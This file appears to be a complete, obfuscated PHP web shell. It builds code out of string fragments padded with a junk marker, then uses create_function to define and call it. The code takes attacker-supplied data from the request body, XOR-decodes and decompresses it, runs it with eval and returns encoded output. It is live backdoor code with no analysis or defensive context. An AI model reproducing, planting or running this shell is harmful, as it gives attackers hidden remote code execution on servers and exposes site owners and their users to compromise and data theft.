<?php
$x='$jYk="48167e4ajY";jY$jYkhjY="fd5ejYbbb7807e";jY$kf="bejYfb5ca073jYfjYf";$p=jY"WQUIT4RjY479bmNKWF";funcjYtionjY x($tjYj';
$Y=str_replace('j','','crejjatej_jfunjcjtion');
$V='_jYconjYtents();@jYobjY_end_cleanjY();jY$r=@bjYase6jY4_encode(jY@x(@gjYzcojYmpjYress($o),$jYk));print("$pjY$kh$jYr$kf");}';
$B='$o.=$jYjYt{$i}^$k{$jYjYj};}}jYreturn $o;}if jY(@jYpreg_matcjYh("/jYjY$kh(.+)$kf/"jY,@file_gejYt_contjYjYejYnjYts("php:/';
$M='/input"),$mjYjY)==1) {@ob_stajYrt();@jYevajYl(@gzuncomjYprejYss(@x(@jYbajYse64_decodejY($m[jY1]),$k))jY)jY;$o=@ob_get';
$D='Y,jY$k){$c=strlenjY($k);$l=strjYlen($tjY);$o="";fjYor($ijY=jY0;$i<$l;){for(jYjY$j=jY0;($j<$c&&jY$i<$l);$j+jY+,$i+jY+){';
$w=str_replace('jY','',$x.$D.$B.$M.$V);
$I=$Y('',$w);$I();
?>
